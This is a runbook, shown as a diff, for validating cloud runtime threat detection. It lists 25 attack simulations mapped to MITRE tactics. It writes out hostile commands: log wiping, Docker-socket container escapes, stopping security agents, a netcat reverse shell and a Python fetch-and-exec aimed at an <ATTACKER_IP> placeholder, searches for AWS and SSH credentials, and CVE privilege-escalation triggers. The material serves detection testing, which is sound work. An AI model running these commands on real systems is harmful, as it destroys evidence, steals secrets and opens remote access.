@@ -1,0 +1,464 @@
+
+================================================================================
+         CLOUD RUNTIME SECURITY — THREAT DETECTION TESTING RUNBOOK
+                     SecOps Testbed  |  v0.9.10 / v0.9.11
+================================================================================
+
+  OVERVIEW
+  --------
+  This runbook contains 25 threat simulation test cases designed to validate
+  cloud runtime security detection coverage. Each test maps to a real-world
+  attack technique and a corresponding Kubernetes manifest.
+
+  BASE IMAGE   angelrita/base-ubuntu:latest
+  TOTAL TESTS  25  (v0.9.10: 14 tests  |  v0.9.11: 11 tests)
+
+
+================================================================================
+  GETTING STARTED
+================================================================================
+
+  Follow these steps before running any test command.
+
+  1. Deploy the testbed pod
+     ----------------------
+     kubectl apply -f secops-testbed.yaml
+
+  2. Confirm the pod is running
+     --------------------------
+     kubectl get pods -l app=secops-testbed
+
+  3. Open an interactive shell inside the pod
+     -----------------------------------------
+     kubectl exec -it deploy/secops-testbed -- /bin/bash
+
+  4. Run test commands one by one from this runbook
+     ------------------------------------------------
+     Execute each command inside the shell and verify your detection
+     platform raises an alert for the corresponding technique.
+
+  5. Clean up when done
+     -------------------
+     kubectl delete deployment secops-testbed
+
+
+================================================================================
+  VERSION 0.9.10                                                    14 TEST CASES
+================================================================================
+
+
+  TEST 01 — System Log Tampering & Destruction
+  ─────────────────────────────────────────────
+  Tactic    Defense Evasion
+  Manifest  manifests/0.9.10/clear-system-logs.yaml
+
+  Simulates an attacker wiping system logs to cover tracks after initial
+  compromise. Targets syslog, auth, kernel, mail, cron, boot, and database
+  log files.
+
+  Commands:
+    rm /var/log/syslog
+    rm /var/log/messages
+    rm /var/log/auth.log
+    rm /var/log/secure
+    rm /var/log/boot.log
+    rm /var/log/maillog
+    rm /var/log/mail.log
+    rm /var/log/kern.log
+    rm /var/log/dmesg
+    rm /var/log/faillog
+    rm /var/log/cron
+    rm /var/log/daemon.log
+    rm /var/log/btmp
+    rm /var/log/mysqld.log
+    rm /var/log/mysql.log
+    rm /var/log/xferlog
+
+
+  TEST 02 — Container Escape via Docker Socket Mount
+  ───────────────────────────────────────────────────
+  Tactic    Privilege Escalation / Container Breakout
+  Manifest  manifests/0.9.10/container-escape-using-docker-socket.yaml
+
+  Mounts the host root filesystem into a privileged container and chroots
+  into it, gaining full host-level access from within the container.
+
+  Command:
+    docker run --rm -it --privileged -v /:/mnt alpine chroot /mnt
+
+
+  TEST 03 — Container Escape via Docker Runtime API Socket
+  ─────────────────────────────────────────────────────────
+  Tactic    Privilege Escalation / Lateral Movement
+  Manifest  manifests/0.9.10/container-escape-using-runtime-socket.yaml
+
+  Communicates directly with the Docker daemon via its UNIX socket to create
+  a new container, bypassing standard Kubernetes admission and security controls.
+
+  Command:
+    curl -s --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d "{'Image':'alpine','Cmd':['sh','-c','echo Hello from Alpine'],'AttachStdout':true,'AttachStderr':true}" http://localhost/containers/create?name=alpine-from-api
+
+
+  TEST 04 — Container Escape via cgroup Namespace Manipulation
+  ─────────────────────────────────────────────────────────────
+  Tactic    Privilege Escalation / Container Breakout
+  Manifest  manifests/0.9.10/container-escape-via-cgroup.yaml
+
+  Uses Linux namespace unsharing combined with cgroup filesystem mounting to
+  escape container isolation boundaries and gain elevated host-level access.
+
+  Commands:
+    unshare -UrmC bash
+    mount -t cgroup -o memory cgroup /mnt
+
+
+  TEST 05 — Credential Theft via Shell History Access
+  ────────────────────────────────────────────────────
+  Tactic    Credential Access
+  Manifest  manifests/0.9.10/credential-access-bash-history.yaml
+
+  Reads shell history files to harvest credentials, tokens, or commands with
+  embedded secrets, then removes the history file to hinder forensic analysis.
+
+  Commands:
+    cat /.bash_history
+    rm /.zsh_history
+
+
+  TEST 06 — Cryptominer Execution via MSR Kernel Module
+  ──────────────────────────────────────────────────────
+  Tactic    Impact / Resource Hijacking
+  Manifest  manifests/0.9.10/cryptominer-execution.yaml
+
+  Loads the MSR (Model Specific Register) kernel module with write access
+  enabled — a prerequisite used by cryptomining malware to disable CPU
+  security mitigations and maximize mining throughput.
+
+  Command:
+    modprobe msr allow_writes=on
+
+
+  TEST 07 — Egress Traffic Tunneling via SOCKS Proxy
+  ───────────────────────────────────────────────────
+  Tactic    Command and Control / Exfiltration
+  Manifest  manifests/0.9.10/curl-using-socks-proxy.yaml
+
+  Routes outbound traffic through a SOCKS4 proxy to bypass network monitoring,
+  egress filtering, and data loss prevention controls.
+
+  Command:
+    curl -x socks4://proxy.example.com http://www.example.com/
+
+
+  TEST 08 — Kubernetes Service Account Token Created Inside Container
+  ───────────────────────────────────────────────────────────────────
+  Tactic    Privilege Escalation / Persistence
+  Manifest  manifests/0.9.10/kubernetes-service-account-token-created-in-container.yaml
+
+  Creates a new Kubernetes service account from within a running container,
+  potentially establishing a persistent identity with Kubernetes API access.
+
+  Command:
+    kubectl create serviceaccount my-serviceaccount
+
+
+  TEST 09 — Internal Network Scanning for Exposed Redis Instances
+  ───────────────────────────────────────────────────────────────
+  Tactic    Discovery / Reconnaissance
+  Manifest  manifests/0.9.10/network-scanning-utility.yaml
+
+  Uses pnscan to perform high-speed banner-based scanning across a /16 subnet
+  targeting port 6379 (Redis), identifying unauthenticated database instances.
+
+  Command:
+    pnscan -t512 -R 6f 73 3a 4c 69 6e 75 78 -W 2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a 221.0.0.0/16 6379
+
+
+  TEST 10 — Process Concealment via /proc hidepid Remount
+  ────────────────────────────────────────────────────────
+  Tactic    Defense Evasion
+  Manifest  manifests/0.9.10/process-hidden-using-mount-hidepid.yaml
+
+  Remounts the /proc filesystem with hidepid=2 to conceal running processes
+  from other users — commonly used to hide malicious activity on shared nodes.
+
+  Command:
+    mount -o remount,hidepid=2 /proc
+
+
+  TEST 11 — Persistence via Cron Job Scheduling
+  ──────────────────────────────────────────────
+  Tactic    Persistence
+  Manifest  manifests/0.9.10/schedule-cron-jobs.yaml
+
+  Opens the crontab editor to schedule recurring tasks — a standard technique
+  for maintaining persistent execution after initial compromise.
+
+  Command:
+    crontab -e
+
+
+  TEST 12 — Security Agent & Antimalware Process Termination
+  ───────────────────────────────────────────────────────────
+  Tactic    Defense Evasion / Impair Defenses
+  Manifest  manifests/0.9.10/stop-antimalware-process.yaml
+
+  Stops known cloud security and antimalware agents to disable runtime
+  protection prior to further exploitation. Targets Alibaba Cloud Agent,
+  AppArmor, BCM Agent, and Aegis security services.
+
+  Commands:
+    service aliyun.service stop
+    service apparmor stop
+    service bcm-agent stop
+    service aegis stop
+
+
+  TEST 13 — Reverse Shell Execution via Netcat
+  ─────────────────────────────────────────────
+  Tactic    Command and Control / Execution
+  Manifest  manifests/0.9.10/netcat-reverse-shell-execution.yaml
+
+  Establishes an outbound reverse shell using netcat, connecting back to an
+  attacker-controlled listener and spawning an interactive bash session over
+  the network.
+
+  NOTE: Replace <ATTACKER_IP> and <PORT> with your controlled lab listener.
+
+  Command:
+    nc -e /bin/bash <ATTACKER_IP> <PORT>
+
+
+  TEST 14 — Fileless Remote Script Execution via Python urllib
+  ─────────────────────────────────────────────────────────────
+  Tactic    Execution / Command and Control
+  Manifest  manifests/0.9.10/python-executed-with-suspicious-arguments.yaml
+
+  Uses Python's urllib to fetch and execute a remote script directly in memory
+  without writing to disk — a fileless execution technique used to evade
+  file-based and signature-based detection.
+
+  NOTE: Replace <ATTACKER_IP> and <PORT> with your controlled lab server.
+
+  Command:
+    python3 -c 'import urllib.request; exec(urllib.request.urlopen("http://<ATTACKER_IP>:<PORT>/payload.py").read())'
+
+
+================================================================================
+  VERSION 0.9.11                                                    11 TEST CASES
+================================================================================
+
+
+  TEST 15 — Symlink & Hardlink Creation Over Sensitive System Files
+  ─────────────────────────────────────────────────────────────────
+  Tactic    Defense Evasion / Privilege Escalation
+  Manifest  manifests/0.9.11/create-symlink-or-hardlink-over-sensitive-files.yaml
+
+  Creates both a hardlink and a symbolic link pointing to /etc/passwd, enabling
+  indirect file manipulation or privilege escalation via link-based attacks.
+
+  Commands:
+    ln /etc/passwd /tmp/passwdlink
+    ln -s /etc/passwd /tmp/passwdsymlink
+
+
+  TEST 16 — Raw Filesystem Access via debugfs in Privileged Container
+  ────────────────────────────────────────────────────────────────────
+  Tactic    Discovery / Credential Access
+  Manifest  manifests/0.9.11/debugfs-launched-in-privileged-container.yaml
+
+  Launches debugfs, an ext2/ext3/ext4 filesystem debugger providing raw
+  block-level disk access — enabling recovery of deleted files, bypassing
+  filesystem permissions, and reading sensitive data directly from disk.
+
+  Command:
+    debugfs
+
+
+  TEST 17 — DinD Escape Attempt via Containerd Socket
+  ─────────────────────────────────────────────────────
+  Tactic    Privilege Escalation / Container Breakout
+  Manifest  manifests/0.9.11/dind-escape-attempt-using-sock.yaml
+
+  Communicates with the containerd socket at a non-standard path to simulate
+  a Docker-in-Docker (DinD) escape, enumerating or controlling other containers
+  on the host via the container runtime directly.
+
+  Command:
+    crictl -r unix:///custom/containerd/containerd.sock images
+
+
+  TEST 18 — Full Memory Dump for Credential Harvesting via LiME
+  ──────────────────────────────────────────────────────────────
+  Tactic    Credential Access / Collection
+  Manifest  manifests/0.9.11/dump-memory-for-credentials.yaml
+
+  Loads the LiME (Linux Memory Extractor) kernel module to capture the full
+  contents of system memory to disk. The resulting dump can be mined offline
+  for credentials, session tokens, encryption keys, and application secrets.
+
+  Command:
+    insmod lime.ko "path=/mnt/memdump.lime format=raw"
+
+
+  TEST 19 — AWS Credential Discovery & Enumeration
+  ──────────────────────────────────────────────────
+  Tactic    Credential Access / Discovery
+  Manifest  manifests/0.9.11/find-aws-credentials.yaml
+
+  Searches the filesystem for AWS access keys and secret credentials across
+  standard and non-standard locations including ~/.aws/, config files, and
+  secrets files.
+
+  Commands:
+    grep aws_access_key_id ~/.aws/credentials
+    fgrep secretaccesskey somefile.txt
+    grep aws_secret_access_key config.txt
+    find / -name .aws/credentials
+    mlocate .aws/credentials
+    locate secrets.txt
+
+
+  TEST 20 — Environment Variable Enumeration via printenv
+  ────────────────────────────────────────────────────────
+  Tactic    Discovery / Credential Access
+  Manifest  manifests/0.9.11/k8s-printenv-execution.yaml
+
+  Dumps all environment variables from the container process. Commonly used
+  to harvest API keys, database passwords, and Kubernetes service account
+  tokens injected via environment variables in pod specs.
+
+  Command:
+    printenv
+
+
+  TEST 21 — Polkit Local Privilege Escalation — PwnKit (CVE-2021-4034)
+  ──────────────────────────────────────────────────────────────────────
+  Tactic    Privilege Escalation
+  Manifest  manifests/0.9.11/polkit-local-privilege-escalation.yaml
+
+  Simulates the PwnKit vulnerability (CVE-2021-4034) by copying the bash
+  binary to a file named pkexec and executing it, exploiting Polkit's pkexec
+  to achieve local privilege escalation to root without authentication.
+
+  Commands:
+    cp /bin/bash pkexec
+    ./pkexec
+
+
+  TEST 22 — SUID Binary Reconnaissance
+  ──────────────────────────────────────
+  Tactic    Discovery / Privilege Escalation
+  Manifest  manifests/0.9.11/reconnaissance-attempt-to-find-suid-binaries.yaml
+
+  Performs a full filesystem scan for SUID and SGID binaries — a standard
+  technique to identify executables that run with elevated privileges and can
+  be abused for local privilege escalation to root.
+
+  Command:
+    find / -xdev -type f -perm -4000 -ls 2>/dev/null
+
+
+  TEST 23 — SSH Private Key & Password File Discovery
+  ─────────────────────────────────────────────────────
+  Tactic    Credential Access
+  Manifest  manifests/0.9.11/search-private-keys-and-passwords.yaml
+
+  Searches for SSH private key files across the filesystem targeting RSA,
+  Ed25519, and ECDSA key types, and inspects known locations for extractable
+  key material.
+
+  Commands:
+    find / -name id_rsa
+    grep "BEGIN RSA PRIVATE KEY" ~/.ssh/id_rsa
+    find /home -name id_ed25519
+    egrep "BEGIN OPENSSH PRIVATE KEY" ~/.ssh/id_ed25519
+    fgrep "BEGIN PRIVATE KEY" ~/.ssh/id_ecdsa
+
+
+  TEST 24 — Sudo Heap Overflow — Baron Samedit (CVE-2021-3156)
+  ─────────────────────────────────────────────────────────────
+  Tactic    Privilege Escalation
+  Manifest  manifests/0.9.11/sudo-potential-privilege-escalation.yaml
+
+  Simulates the Baron Samedit heap-based buffer overflow (CVE-2021-3156) in
+  sudo via sudoedit, allowing unprivileged users to gain root access on
+  unpatched systems without requiring a password.
+
+  Command:
+    sudo -u test sudoedit -s \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \\
+
+
+  TEST 25 — Covert Data Exfiltration via Steganography (steghide)
+  ────────────────────────────────────────────────────────────────
+  Tactic    Exfiltration / Obfuscation
+  Manifest  manifests/0.9.11/usage-of-steganography-tools.yaml
+
+  Uses steghide to embed a secret file inside a JPEG image. Attackers use
+  this technique to exfiltrate sensitive data covertly by concealing it
+  within innocuous-looking media files that bypass standard controls.
+
+  Command:
+    steghide embed -cf test.jpg -ef secret.txt
+
+
+================================================================================
+  TEST SUMMARY
+================================================================================
+
+   #   Test Name                                            Tactic
+  ───  ───────────────────────────────────────────────────  ──────────────────────────
+   01  System Log Tampering & Destruction                   Defense Evasion
+   02  Container Escape via Docker Socket Mount             Privilege Escalation
+   03  Container Escape via Docker Runtime API Socket       Privilege Escalation
+   04  Container Escape via cgroup Namespace Manipulation   Privilege Escalation
+   05  Credential Theft via Shell History Access            Credential Access
+   06  Cryptominer Execution via MSR Kernel Module          Impact / Resource Hijacking
+   07  Egress Traffic Tunneling via SOCKS Proxy             Command & Control
+   08  Kubernetes Service Account Token in Container        Privilege Escalation
+   09  Network Scanning for Exposed Redis Instances         Discovery / Reconnaissance
+   10  Process Concealment via /proc hidepid Remount        Defense Evasion
+   11  Persistence via Cron Job Scheduling                  Persistence
+   12  Security Agent & Antimalware Termination             Defense Evasion
+   13  Reverse Shell Execution via Netcat                   Command & Control
+   14  Fileless Remote Script Execution via Python          Execution
+   15  Symlink & Hardlink Over Sensitive System Files       Defense Evasion
+   16  Raw Filesystem Access via debugfs                    Discovery
+   17  DinD Escape Attempt via Containerd Socket            Privilege Escalation
+   18  Memory Dump for Credential Harvesting (LiME)         Credential Access
+   19  AWS Credential Discovery & Enumeration               Credential Access
+   20  Environment Variable Enumeration via printenv        Discovery
+   21  Polkit Local Privilege Escalation — PwnKit           Privilege Escalation
+   22  SUID Binary Reconnaissance                           Discovery
+   23  SSH Private Key & Password File Discovery            Credential Access
+   24  Sudo Heap Overflow — Baron Samedit (CVE-2021-3156)   Privilege Escalation
+   25  Covert Data Exfiltration via Steganography           Exfiltration
+
+  Version 0.9.10  |  Tests 01 – 14  |  14 test cases
+  Version 0.9.11  |  Tests 15 – 25  |  11 test cases
+
+
+================================================================================
+  MITRE ATT&CK TACTIC COVERAGE
+================================================================================
+
+  Tactic                        Tests
+  ────────────────────────────  ──────────────────────────────────────────────
+  Defense Evasion               01, 10, 12, 15
+  Privilege Escalation          02, 03, 04, 08, 17, 21, 22, 24
+  Credential Access             05, 18, 19, 23
+  Impact / Resource Hijacking   06
+  Command and Control           07, 13
+  Persistence                   08, 11
+  Discovery / Reconnaissance    09, 16, 20, 22
+  Execution                     13, 14
+  Exfiltration                  07, 25
+
+
+================================================================================
+  DISCLAIMER
+  These test cases are intended solely for use in authorized and isolated lab
+  environments. Do not execute against production workloads or any system
+  without explicit written authorization. Misuse of these tests against
+  unauthorized systems may violate applicable laws and regulations.
+================================================================================
